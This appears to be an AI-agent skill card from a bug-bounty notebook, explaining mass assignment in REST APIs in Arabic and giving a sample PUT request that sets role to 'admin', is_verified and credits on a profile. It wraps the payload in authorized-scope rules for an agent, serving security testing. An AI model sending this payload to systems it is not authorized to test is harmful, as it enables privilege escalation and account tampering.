# SKILL: Mass Assignment في REST APIs — إضافة حقول غير مسموحة

**Skill id:** `tip/mass-assignment-في-rest-apis-إضافة-حقول-غير-مسموحة`  
**Category:** API Hacking  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e88081e8be45c5678b3342b3  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **API Hacking**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو طلب update profile بيقبل JSON body، جرّب ضيف حقول مفترض إنها read-only زي role أو is\_verified أو credits. لو السيرفر قبل وحفظها، يبقى fiha mass assignment vulnerability. شائعة في Node.js/Mongoose/Express لما مفيش strict schema.

## Payload / Code

```
PUT /api/user/profile
\{
  "name": "Attacker",
  "email": "[attacker@evil.com](mailto:attacker@evil.com)",
  "role": "admin",
  "is\_verified": true,
  "credits": 99999
\}
```

## Source

Redfox Security 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
